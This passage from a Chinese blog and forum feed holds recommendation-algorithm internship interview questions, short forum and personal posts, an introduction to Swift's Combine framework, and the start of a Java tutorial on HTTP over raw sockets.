<p>算法题：求从左上角到右下角的最小开销。给定一个二维数组arr<i>[j]，数组中每个点表示经过该点的开销，求从左上角为起点，右下角为终点的最小开销，在每个点时只能往右或者往下走，同时中途可能会有障碍，即有些点不能走，obs<i>[j]=1时表示(i, j)不能走。dp和dp状态压缩。</i></i></p>
<ol style="list-style-type:decimal"><li><i><i>介绍一个比赛</i></i></li>
<li>ANN用的什么工具，介绍一下原理</li>
<li>如何提高冷门商品的推荐效果的</li>
<li>了不了解大数据框架</li>
<li>说一下你熟悉的linux命令</li>
<li>一个文件每行一个数字，用命令统计所有数的平均值和数字个数</li>
<li>逻辑回归损失函数和求导</li>
<li>介绍一下你了解的优化器和各自的优缺点</li>
<li>Adam和Adagrad的区别</li></ol>

<h2>三面</h2>
<p>算法题：有一个长度为n的数组，求一个数k，k的取值区间为[1, n-1]，使得数组的前k个数和后n-k个数的方差和最小。要求化简方差公式，达到计算子序列方差的时间复杂度为O(n)。解出来后又要求空间复杂度为常数级别。</p>

<ol style="list-style-type:decimal"><li>写逻辑回归的logloss损失函数</li>
<li>逻辑回归损失函数可以用mse吗（从梯度角度）</li>
<li>逻辑回归建模，如果只有9个正样本，一个负样本，那么有一列特征，这个特征对于的权重是正还是负  </li>
<li>介绍认为做的最好的项目</li>
<li>项目中如何缓解曝光偏差的</li>
<li>Embedding ANN召回用的什么工具</li></ol>

<h1>快手-社区科学部-推荐算法</h1>
<p>快手是先统一面试，技术面结束后，HR 联系才知道具体的小组。快手的面试风格感觉和字节很像，先做两道算法题。一面先做题，第二题卡了好久才做完，所以剩下的时间不多，面试官也没多问，就简单了解了一下竞赛项目。二面也是先做题，基础问的不多，也问到了“逻辑回归损失函数可以用mse吗”，大部分时间都在和我讨论 kdd cup 的项目流程是否合理和为什么要这么做。快手总共两轮技术面，隔了大概两周才有 HR 沟通后续。</p>

<h1>腾讯-应用宝-推荐算法</h1>
<p>投的腾讯微视，被应用宝捞了。</p>
<h2>一面</h2>
<ol style="list-style-type:decimal"><li>介绍一个最有把握的比赛</li>
<li>介绍比赛中itemcf具体做法</li>
<li>在itemcf中如何引入时间间隔信息和位置间隔信息</li>
<li>基于商品属性embedding的召回这么做的</li>
<li>Annoy的原理</li>
<li>基于w2v的ANN怎么做的</li>
<li>w2v的原理</li>
<li>w2v的loss函数</li>
<li>loss函数还有哪些</li>
<li>如何解决冷启动问题</li>
<li>如何评价召回的效果</li>
<li>如何把召回的信息引入到排序</li>
<li>GBDT，xgboost，lightgbm改进的过程</li>
<li>简单推导xgboost</li>
<li>构建一棵树分裂特征怎么选择</li>
<li>计算分裂增益的方法有哪些</li>
<li>LSTM的门机制</li>
<li>LSTM相较于RNN的优势</li>
<li>transformer的机制</li>
<li>推荐里面深度模型的了解</li>
<li>NN怎么达到泛化性</li>
<li>如何保证的稀疏性</li>
<li>L1正则为什么可以达到模型的稀疏性</li></ol>

<h2>二面</h2>
<ol style="list-style-type:decimal"><li>比赛分工</li>
<li>embedding存在之前没有出现过id怎么办</li>
<li>w2v的样本怎么构造</li>
<li>有没有过滤低频id</li>
<li>cbow 与 skip-gram 的区别和优缺点</li>
<li>多任务学习有哪些结构</li>
<li>多个召回怎么合并的</li>
<li>多个召回分数之间是可比的吗</li>
<li>各个召回的权重是怎么选取的</li>
<li>推荐系统里面是如何考虑冷门商品</li>
<li>新增一路召回，在排序阶段需要做什么改进</li>
<li>树模型对离散特征怎么处理的</li>
<li>树模型怎么决定一个叶子结点是否要分裂</li>
<li>xgboost正则化项和什么有关</li></ol>

<h2>三面</h2>
<p>做了三道算法题：leetcode 53.最大子序和，leetcode 75.颜色分类，leetcode 442.数组中重复的数据</p>

<h2>四面</h2>
<ol style="list-style-type:decimal"><li>介绍项目</li>
<li>算法题：剑指 Offer 60.n个骰子的点数</li></ol>

<h1>百度</h1>
<p>应该是百度的实习专场，三轮技术连着面。</p>
<h2>一面</h2>
<p>算法题：leetcode 70.爬楼梯</p>
<ol style="list-style-type:decimal"><li>介绍竞赛项目</li>
<li>竞赛数据规模</li>
<li>ANN中用户的embedding怎么得到的</li>
<li>w2v的召回具体怎么做的</li>
<li>ANN的工具用的啥</li>
<li>基于深度的召回怎么做的</li>
<li>排序阶段的特征有哪些</li>
<li>后打压怎么做的</li></ol>

<h2>二面</h2>
<p>算法题：假设现在有很多海岛，有些海岛之间有桥连接，你已知海岛连接情况。 ① 我现在想从到 A岛 去 B岛，问是否能通过陆路到达（过桥） ②如果可以，最少需要过几次桥 ③输出一条最短的路径 （P.S. 最好可以写一个非递归的形式）</p>
<ol style="list-style-type:decimal"><li>介绍竞赛</li>
<li>评估标准是啥</li>
<li>哪些特征比较有用</li>
<li>多路召回的分数为什么要相加</li>
<li>有没有分析 bad case</li>
<li>优化思路</li>
<li>讲一下推荐的方法</li>
<li>一个全连接层有多少参数</li>
<li>介绍 attention</li></ol>
    <br>
<h2>三面（手百推荐部门）</h2>
<ol style="list-style-type:decimal"><li>介绍研究方向</li>
<li>论文中 embedding 效果的评价方法和指标</li>
<li>为什么选择数据挖掘这个方向</li>
<li>对于实习的目标</li>
<li>反问部门业务和技术栈</li></ol>]]></content>
        <author>
            <name><![CDATA[A2OS 开源社区论坛]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://bbs.a2os.club/d/8-push/1</id>
        <title><![CDATA[论坛有通知网页 push 的功能嘛]]></title>
        <updated>2021-04-06T07:35:33+08:00</updated>
        <link href="https://bbs.a2os.club/d/8-push/1"/>
        <content type="text/html" src="https://bbs.a2os.club/d/8-push/1"><![CDATA[<p>比如 <a href="https://www.webpushr.com/" rel=" nofollow ugc">webpushr </a>提供的这种。</p>]]></content>
        <author>
            <name><![CDATA[A2OS 开源社区论坛]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://bbs.a2os.club/d/7-/1</id>
        <title><![CDATA[如何阅读论文？]]></title>
        <updated>2021-04-06T07:33:34+08:00</updated>
        <link href="https://bbs.a2os.club/d/7-/1"/>
        <content type="text/html" src="https://bbs.a2os.club/d/7-/1"><![CDATA[<p>虽然大家关注的领域不同，但肯定都会读不少论文。大家都是如何阅读论文的？是每篇都精读？还是看个摘要泛泛而过？</p>

<p>希望大家分享一下自己阅读论文的心得。</p>]]></content>
        <author>
            <name><![CDATA[A2OS 开源社区论坛]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/612</id>
        <title><![CDATA[会挽雕弓如满月]]></title>
        <updated>2021-04-04T15:52:37+08:00</updated>
        <link href="https://www.suruifu.com/posts/612"/>
        <content type="text/html" src="https://www.suruifu.com/posts/612"><![CDATA[<p>事情从来没有简单过。</p>
<p>昨天的努力为今天带来了希望，今天的冷静才能唤醒明天的梦想。</p>
<p>我能行，我会赢。</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/603</id>
        <title><![CDATA[战战兢兢 如履薄冰]]></title>
        <updated>2021-03-26T17:46:04+08:00</updated>
        <link href="https://www.suruifu.com/posts/603"/>
        <content type="text/html" src="https://www.suruifu.com/posts/603"><![CDATA[]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://rayzhao98.top/combine-chu-tan/</id>
        <title><![CDATA[Combine 初探]]></title>
        <updated>2021-03-23T14:48:21+08:00</updated>
        <link href="https://rayzhao98.top/combine-chu-tan/"/>
        <content type="text/html" src="https://rayzhao98.top/combine-chu-tan/"><![CDATA[<h2 id="%E4%BB%80%E4%B9%88%E6%98%AF%E5%93%8D%E5%BA%94%E5%BC%8F%E7%BC%96%E7%A8%8B">&#x4EC0;&#x4E48;&#x662F;&#x54CD;&#x5E94;&#x5F0F;&#x7F16;&#x7A0B;</h2><img src="https://rayzhao98.top/content/images/2021/03/Image.png" alt="Combine &#x521D;&#x63A2;"><p>&#x54CD;&#x5E94;&#x5F0F;&#x7F16;&#x7A0B;&#x662F;&#x4F7F;&#x7528;&#x5F02;&#x6B65;&#x6570;&#x636E;&#x6D41;&#x8FDB;&#x884C;&#x7F16;&#x7A0B;&#x6240;&#x8C13;&#x6570;&#x636E;&#x6D41;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x6210;&#xFF0C;&#x5728;&#x4E00;&#x6761;&#x65F6;&#x95F4;&#x7EBF;&#x4E0A;&#xFF0C;&#x4E0D;&#x65AD;&#x89E6;&#x53D1;&#x7279;&#x5B9A;&#x4E8B;&#x4EF6;&#xFF0C;&#x5236;&#x9020;&#x6570;&#x636E;&#x3002;&#x6BD4;&#x5982;&#x4E0B;&#x9762;&#x8FD9;&#x5F20;&#x56FE;&#xFF0C;&#x6211;&#x4EEC;&#x6CA1;&#x89E6;&#x53D1;&#x4E00;&#x4E2A;&#x4E8B;&#x4EF6;&#xFF0C;&#x5C31;&#x4F1A;&#x5728;&#x8FD9;&#x6761;&#x65F6;&#x95F4;&#x7EBF;&#x4E0A;&#x7559;&#x4E0B;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#xFF0C;&#x8FD9;&#x4E2A;&#x8282;&#x70B9;&#x5C31;&#x662F;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x4E00;&#x8FDE;&#x4E32;&#x7684;&#x6570;&#x636E;&#x7EC4;&#x6210;&#x4E86;&#x6570;&#x636E;&#x6D41;&#xFF0C;&#x76F4;&#x5230;&#x201C;Complete&#x201D;&#x8FD9;&#x4E2A;&#x4FE1;&#x53F7;&#xFF0C;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x6D41;&#x624D;&#x5230;&#x7EC8;&#x70B9;&#x3002;</p><figure class="kg-card kg-image-card"><img src="https://res.craft.do/user/full/cd5767b5-001d-b2bb-2322-53e695067937/doc/C98F9419-83EC-4423-A17E-356E0BA0CB61/235B9661-ADE3-4592-B659-E5AA12FEB249_2" class="kg-image" alt="Combine &#x521D;&#x63A2;" loading="lazy"></figure><p>&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x7684;&#x4EA7;&#x751F;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x201C;&#x53D1;&#x5E03;&#x8005;&#x201D;&#x53D1;&#x5E03;&#x7684;&#xFF0C;&#x5149;&#x6709;&#x201C;&#x53D1;&#x5E03;&#x8005;&#x201D;&#x5F53;&#x7136;&#x4E0D;&#x591F;&#xFF0C;&#x5C31;&#x50CF;&#x5382;&#x5BB6;&#x751F;&#x4EA7;&#x4E86;&#x5F88;&#x591A;&#x5546;&#x54C1;&#xFF0C;&#x6CA1;&#x6709;&#x4EBA;&#x7528;&#x5C31;&#x6CA1;&#x6709;&#x610F;&#x4E49;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x8FD8;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x201C;&#x6D88;&#x8D39;&#x8005;&#x201D;&#x7684;&#x5B58;&#x5728;&#x3002;&#x5728;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x79F0;&#x4E4B;&#x4E3A;&#x201C;&#x89C2;&#x5BDF;&#x8005;&#x201D;&#xFF0C;&#x800C;&#x6570;&#x636E;&#x6D41;&#x5C31;&#x662F;&#x201C;&#x88AB;&#x89C2;&#x5BDF;&#x8005;&#x201D;&#x3002;&#x5728;&#x6709;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x89C2;&#x5BDF;&#x8005;&#x76D1;&#x542C;&#x5230;&#x4E86;&#x6570;&#x636E;&#x53D8;&#x5316;&#xFF0C;&#x62FF;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x6765;&#x505A;&#x4E00;&#x7CFB;&#x5217;&#x4E8B;&#x60C5;&#x3002;&#x8BF4;&#x5230;&#x89C2;&#x5BDF;&#x8005;&#x4E0E;&#x88AB;&#x89C2;&#x5BDF;&#x8005;&#xFF0C;&#x5C31;&#x4E0D;&#x5F97;&#x4E0D;&#x63D0;&#x5230;&#x89C2;&#x5BDF;&#x8005;&#x6A21;&#x5F0F;&#x3002;</p><h3 id="%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F">&#x89C2;&#x5BDF;&#x8005;&#x6A21;&#x5F0F;</h3><p>&#x89C2;&#x5BDF;&#x8005;&#x6A21;&#x5F0F;&#x662F;&#x4E00;&#x79CD;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#xFF0C;&#x5F53;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#xFF0C;&#x4F1A;&#x901A;&#x77E5;&#x8BA2;&#x9605;&#x5B83;&#x7684;&#x5176;&#x4ED6;&#x5BF9;&#x8C61;&#xFF0C;&#x8FD9;&#x4E9B;&#x5BF9;&#x8C61;&#x505A;&#x51FA;&#x76F8;&#x5E94;&#x7684;&#x53CD;&#x5E94;&#xFF0C;&#x8FD9;&#x4E24;&#x8005;&#x88AB;&#x79F0;&#x4E3A;&#x88AB;&#x89C2;&#x5BDF;&#x8005;&#x4E0E;&#x89C2;&#x5BDF;&#x8005;&#x3002;&#x5F53;&#x88AB;&#x89C2;&#x5BDF;&#x8005;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x5411;&#x5B83;&#x7684;&#x89C2;&#x5BDF;&#x8005;&#x53D1;&#x51FA;&#x5E7F;&#x64AD;&#x901A;&#x77E5;&#x3002;</p><h3 id="%E5%B0%8F%E4%BE%8B%E5%AD%90">&#x5C0F;&#x4F8B;&#x5B50;</h3><p>&#x6211;&#x4EEC;&#x6765;&#x4E00;&#x4E2A;&#x6709;&#x70B9;&#x96BE;&#x5EA6;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x4E24;&#x6B21;&#x6216;&#x591A;&#x6B21;&#x70B9;&#x51FB;&#x7684;&#x4E8B;&#x4EF6;&#x6D41;&#xFF0C;&#x60F3;&#x8C61;&#x4E00;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x7528;&#x4F20;&#x7EDF;&#x7684;&#x547D;&#x4EE4;&#x5F0F;&#x7F16;&#x7A0B;&#xFF0C;&#x8FD9;&#x4E2A;&#x5B9E;&#x73B0;&#x8D77;&#x6765;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x901A;&#x8FC7;&#x54CD;&#x5E94;&#x5F0F;&#x7F16;&#x7A0B;&#xFF0C;&#x65B9;&#x4FBF;&#x53C8;&#x6613;&#x7406;&#x89E3;&#x3002;</p><figure class="kg-card kg-image-card"><img src="https://res.craft.do/user/full/cd5767b5-001d-b2bb-2322-53e695067937/doc/C98F9419-83EC-4423-A17E-356E0BA0CB61/ACA94231-5092-4B53-BD5A-48AF53D19027_2" class="kg-image" alt="Combine &#x521D;&#x63A2;" loading="lazy"></figure><p><code>buffer</code> &#x65B9;&#x6CD5;&#x5C06;&#x95F4;&#x8DDD;&#x5C0F;&#x4E8E; 250ms &#x7684;&#x4E8B;&#x4EF6;&#x5408;&#x5E76;&#x5230;&#x4E00;&#x4E2A;&#x5217;&#x8868;&#x4E2D;&#xFF0C;<code>map</code> &#x65B9;&#x6CD5;&#x5C06;&#x5F97;&#x5230;&#x7684;&#x5217;&#x8868;&#x8F6C;&#x6362;&#x6210;&#x5217;&#x8868;&#x957F;&#x5EA6;&#xFF0C;<code>filter</code> &#x65B9;&#x6CD5;&#x7B5B;&#x9009;&#x51FA;&#x957F;&#x5EA6;&#x5927;&#x4E8E;&#x7B49;&#x4E8E; 2 &#x7684;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x5C06;&#x6700;&#x539F;&#x59CB;&#x7684;&#x6570;&#x636E;&#x6D41;&#x8F6C;&#x5316;&#x4E3A;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x7684;&#x6570;&#x636E;&#x6D41;&#x4E86;&#x3002;</p><h2 id="combine">Combine</h2><p>Combine &#x662F;&#x5728; 2019 &#x5E74; WWDC &#x4E0A;&#xFF0C;&#x82F9;&#x679C;&#x63A8;&#x51FA;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x7F16;&#x7A0B;&#x6846;&#x67B6;&#x3002;Combine &#x7531; Swift &#x5B9E;&#x73B0;&#xFF0C;&#x4E5F;&#x662F;&#x4E3A; Swift &#x800C;&#x751F;&#xFF0C;&#x6240;&#x4EE5; Combine &#x652F;&#x6301;&#x8303;&#x578B;&#x3001;&#x53C8;&#x662F;&#x7C7B;&#x578B;&#x5B89;&#x5168;&#x7684;&#x3002;&#x5728; Combine &#x4E2D;&#xFF0C;&#x6709;&#x4E09;&#x4E2A;&#x6838;&#x5FC3;&#x6982;&#x5FF5;&#xFF0C;&#x5206;&#x522B;&#x662F; Publisher&#x3001;Subscriber &#x548C; Operator&#x3002;</p><h3 id="publisher">Publisher</h3><p><code>Publisher</code> &#x534F;&#x8BAE;&#x7528;&#x6765;&#x5B9A;&#x4E49;&#x201C;&#x88AB;&#x89C2;&#x5BDF;&#x8005;&#x201D;&#xFF0C;&#x4E5F;&#x79F0;&#x4E3A;&#x201C;&#x53D1;&#x5E03;&#x8005;&#x201D;&#x3002;</p><pre><code class="language-swift">protocol Publisher {
	associatedtype Output
	associatedtype Failure: Error

	func subscribe&lt;S: Subscriber&gt;(_ subscriber: S)
		where S.Input == Output, S.Failure == Failure
}
</code></pre><p><code>Publisher</code> &#x7684;&#x5B9A;&#x4E49;&#x4E2D;&#xFF0C;Output &#x4EE3;&#x8868;&#x6570;&#x636E;&#x6D41;&#x8F93;&#x51FA;&#x7684;&#x503C;&#xFF0C;Failure &#x4EE3;&#x8868;&#x53EF;&#x80FD;&#x4EA7;&#x751F;&#x7684;&#x9519;&#x8BEF;&#xFF0C;&#x901A;&#x8FC7; subscribe &#x65B9;&#x6CD5;&#x8BA9;&#x4E00;&#x4E2A; Subscriber &#x8FDB;&#x884C;&#x8BA2;&#x9605;&#xFF0C;&#x8FD9;&#x91CC;&#x8981;&#x6C42; subscriber &#x7684;&#x8F93;&#x5165;&#x548C;&#x9519;&#x8BEF;&#x7C7B;&#x578B;&#x4E0E; publisher &#x7684;&#x8F93;&#x51FA;&#x4E0E;&#x9519;&#x8BEF;&#x7C7B;&#x578B;&#x4E00;&#x81F4;&#xFF0C;&#x6765;&#x4FDD;&#x8BC1;&#x7C7B;&#x578B;&#x5B89;&#x5168;&#x3002;</p><h3 id="subscriber">Subscriber</h3><p><code>Subscriber</code> &#x534F;&#x8BAE;&#x7528;&#x6765;&#x5B9A;&#x4E49;&#x201C;&#x89C2;&#x5BDF;&#x8005;&#x201D;&#xFF0C;&#x4ED6;&#x4EEC;&#x53EF;&#x4EE5;&#x8BA2;&#x9605;&#x201C;&#x88AB;&#x89C2;&#x5BDF;&#x8005;&#x201D;&#x5E76;&#x4ECE;&#x4ED6;&#x4EEC;&#x90A3;&#x91CC;&#x63A5;&#x6536;&#x6570;&#x636E;&#x3002;</p><ul><li>Receives values and a completion</li><li>Reference type</li></ul><pre><code class="language-swift">protocol Subscriber {
	associatedtype Input
	associatedtype Failure: Error

	func receive(subscription: Subscription)
	func receive(_ input: Input) -&gt; Subscribers.Demand
	func receive(completion: Subscribers.Completion&lt;Failure&gt;)
}
</code></pre><p>&#x8FD9;&#x4E09;&#x4E2A; receive &#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x5F53; publisher &#x72B6;&#x6001;&#x53D8;&#x5316;&#x65F6;&#xFF0C;&#x63A5;&#x6536;&#x53D8;&#x5316;&#x503C;&#x3002;</p><figure class="kg-card kg-image-card"><img src="https://res.craft.do/user/full/cd5767b5-001d-b2bb-2322-53e695067937/doc/C98F9419-83EC-4423-A17E-356E0BA0CB61/4A246AF0-3649-4B41-A618-F85D0C0D4F0C_2" class="kg-image" alt="Combine &#x521D;&#x63A2;" loading="lazy"></figure><p>&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x4E09;&#x79CD;&#x7C7B;&#x578B;&#x7684; receive &#x5206;&#x522B;&#x63A5;&#x6536;&#xFF1A;</p><ul><li>Subscription&#xFF1A;Subscriber &#x6210;&#x529F;&#x8BA2;&#x9605;&#x65F6;&#x6536;&#x5230;&#x7684;&#x6D88;&#x606F;</li><li>Value&#xFF1A;&#x771F;&#x5B9E;&#x7684;&#x6570;&#x636E;</li><li>Completion&#xFF1A;&#x6570;&#x636E;&#x6D41;&#x7EC8;&#x6B62;&#x65F6;&#x7684;&#x6D88;&#x606F;</li></ul><h3 id="operator">Operator</h3><p>&#x64CD;&#x4F5C;&#x7B26;&#x662F; Combine &#x4E2D;&#x4E09;&#x5927;&#x91CD;&#x8981;&#x6982;&#x5FF5;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#xFF0C;&#x901A;&#x8FC7;&#x5404;&#x79CD;&#x64CD;&#x4F5C;&#x7B26;&#xFF0C;&#x53EF;&#x4EE5;&#x5BF9;&#x539F;&#x59CB;&#x6570;&#x636E;&#x6D41;&#x8FDB;&#x884C;&#x5404;&#x79CD;&#x64CD;&#x4F5C;&#xFF0C;&#x53D8;&#x6210;&#x6700;&#x7EC8;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#x6837;&#x5B50;&#x3002;&#x6BD4;&#x8F83;&#x5E38;&#x89C1;&#x7684;&#x64CD;&#x4F5C;&#x7B26;&#x6709; map&#x3001;filter &#x7B49;&#x7B49;</p><h2 id="%E5%8F%82%E8%80%83">&#x53C2;&#x8003;</h2><ol><li><a href="https://developer.apple.com/documentation/combine/receiving-and-handling-events-with-combine">Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2019/722/">Introducing Combine - WWDC 2019 - Videos - Apple Developer</a></li><li><a href="https://www.icodesign.me/posts/swift-combine/">Swift Combine &#x5165;&#x95E8;&#x5BFC;&#x8BFB;</a></li><li><a href="https://gist.github.com/staltz/868e7e9bc2a7b8c1f754">The introduction to Reactive Programming you&apos;ve been missing</a></li></ol>]]></content>
        <author>
            <name><![CDATA[NINJIACODER忍者小屋]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/597</id>
        <title><![CDATA[怎样孝顺父母呢？]]></title>
        <updated>2021-03-22T13:19:10+08:00</updated>
        <link href="https://www.suruifu.com/posts/597"/>
        <content type="text/html" src="https://www.suruifu.com/posts/597"><![CDATA[<p>唯一无条件对我好的便是我的父母。</p>
<p>怎么孝敬父母呢？或许有人说多回家看看，或许有人说给爸妈多买点东西。我觉得这些说法都对，但是并没有认识到问题的本质。</p>
<p>我觉得要想孝敬父母，首先要真正不和父母要钱。这种真正并不是一时的，还有未来很长一段时间的预期。也就是说现在不要钱，明年也不要钱，但是到了买房的时候突然要上一大笔，那也没有真正不和父母要钱。其实在这种情况下，你知道，父母也知道，未来买房的时候你会要上一大笔。只不过父母替你放了一段时间而已。</p>
<p>那你就拍着大腿说，我牛逼，我就是不跟父母要钱，永远不要。但是当到了那一个时刻，你缺钱，父母有钱的时候，这个永远不要钱就又一次被打破了。</p>
<p>父母总是无条件支持孩子的，父母潜意识中也在一直攒着钱，就是防止有一天，或者说盼着有一天可以给孩子解一个燃眉之需。</p>
<p>这近乎是一种对父母的剥削，而其操纵者是这种潜意识中的共识。如何让父母放弃这种潜意识呢？我想这个问题可以等价为让父母知道自己艰苦努力攒钱是没有用的就行了。那什么叫没有用的呢，我想只要你挣的钱远远高出父母挣的钱，他们自然也就不白费这个力气了。</p>
<p>我呢，针对这个问题，提出一个标准，就叫做<strong>苏瑞辅新时代孝敬标准</strong>吧。当然我现在也没有做到，只是说这是我提出来的。</p>
<p>只有你的月收入高于父母月收入之和十倍的时候，才可以让父母放弃为你攒钱，才真正摆脱了伪孝，才真正停止了对父母无尽的剥削。</p>
<p>苏瑞辅 2021-03-02 自勉</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2021/03/19/blog12/</id>
        <title><![CDATA[Java 原生 Socket 实现 HTTP 通信]]></title>
        <updated>2021-03-19T10:09:28+08:00</updated>
        <link href="http://www.windboy.top/2021/03/19/blog12/"/>
        <content type="text/html" src="http://www.windboy.top/2021/03/19/blog12/"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们很熟悉编写服务端的一个 Controller：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyController</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    MyService myService;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/get"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">getUserList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;User&gt; list = myService.findAll();</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于客户端与服务端之间基于 HTTP 的网络通信，在 Spring Boot 框架的封装下，服务端如何接受 HTTP 请求，如何解析成内存中的对象，完成业务逻辑后如何输出 HTTP 响应，我们不得而知。</p><p>本文将利用 Java 原生 Socket，完成发送 HTTP 请求，并解析 HTTP 响应。</p><h2 id="HttpUrl-类"><a href="#HttpUrl-类" class="headerlink" title="HttpUrl 类"></a>HttpUrl 类</h2><p>HTTP 协议中约定的 URL 格式为：protocol://host:port/path。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpUrl</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    String protocol;</span><br><span class="line">    String host;</span><br><span class="line">    <span class="keyword">int</span> port;</span><br><span class="line">    String path;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * protocol://host:port/path</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HttpUrl</span><span class="params">(String path)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(path);</span><br><span class="line">        protocol = url.getProtocol();</span><br><span class="line">        host = url.getHost();</span><br><span class="line">        port = url.getPort();</span><br><span class="line">        port = port == -<span class="number">1</span> ? url.getDefaultPort() : port;</span><br><span class="line">        <span class="keyword">this</span>.path = url.getFile();</span><br><span class="line">        <span class="keyword">this</span>.path = (<span class="keyword">this</span>.path == <span class="keyword">null</span> || <span class="keyword">this</span>.path.length() == <span class="number">0</span>) ? <span class="string">"/"</span> : <span class="keyword">this</span>.path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProtocol</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> protocol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> port;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> 